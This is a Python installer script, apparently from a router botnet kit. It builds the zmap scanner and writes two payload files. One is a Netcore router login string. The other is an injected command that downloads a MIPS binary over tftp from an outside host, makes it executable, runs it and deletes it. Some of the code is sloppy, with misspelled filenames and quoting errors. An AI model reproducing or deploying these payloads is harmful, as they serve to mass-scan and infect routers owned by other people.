#!/usr/bin/env python3
import time, os, sys, subprocess
def Zmap(): # I want this to be only one file stop judging me
	cmd = "yum update -y"
	install(cmd)
	cmd = "yum install gcc cmake gmp gmp-devel libpcap-devel gengetopt byacc flex -y"
	install(cmd)
	cmd = "yum install json-c-doc.noarch json-c.i686 json-c.x86_64 json-c-devel.i686 json-c-devel.x86_64 -y"
	install(cmd)
	cmd = "yum install epel-release -y"
	install(cmd)
	cmd = "wget https://github.com/zmap/zmap/archive/v2.1.0.tar.gz"
	install(cmd)
	cmd = "tar -xvf v2.1.0.tar.gz"
	install(cmd)
	cmd = "cd zmap-2.1.0"
	install(cmd)
	cmd = """flex -o "src/lexer.c" --header-file="src/lexer.h" "src/lexer.l"""
	install(cmd)
	cmd = """byacc -d -o "src/parser.c" "src/parser.y"""
	install(cmd)
	cmd = "mkdir /etc/zmap"
	install(cmd)
	cmd = "cp conf/* /etc/zmap"
	install(cmd)
	cmd = "cmake -DENABLE_HARDENING=ON"
	install(cmd)
	cmd = "make"
	install(cmd)
	cmd = "make install"
	install(cmd)
	cmd = """python -c "print 'A'*8 + 'netcore\x00'" > loginpayload"""
	install(cmd)
	cmd = """python -c "print 'AA\x00\x00AAAA cd /var/; tftp -g -r mispselss 1.1.1.1; chmod 777 mispel; ./mipsel; rm -rf mipsel\x00'" > commandpayload"""
	install(cmd)
	Wine()
	ownsyou()
	print("Finished Installing... Successfully?")
	print("If this didnt work use INSTALL.SH in backup folder")
def Wine():
	print("\n" * 100)

def ownsyou():
	time.sleep(1)

def install(cmd):
	subprocess.call(cmd, shell=True)
	time.sleep(1)
	Wine()
	ownsyou()

# Define the commands for the install
Perl_Install = "yum install perl -y"

# Menu
Wine()
print("""
                                          88
,adPPYba, 8b      db      d8 ,adPPYYba, MM88MMM
I8[    "" `8b    d88b    d8' ""     `Y8   88
 `"Y8ba,   `8b  d8'`8b  d8'  ,adPPPPP88   88
aa    ]8I   `8bd8'  `8bd8'   88,    ,88   88,
`"YbbdP"'     YP      YP     `"8bbdP"Y8   "Y888 """)
print("#############################################")
print(" \\\  Installer   By   your   lord   Wine  // ")
print("#############################################")
print("1) Install The Program")
Selct = input("Please Enter an option: ")
if Selct == '1':
	cmd = Perl_Install
	install(cmd)
	Zmap()
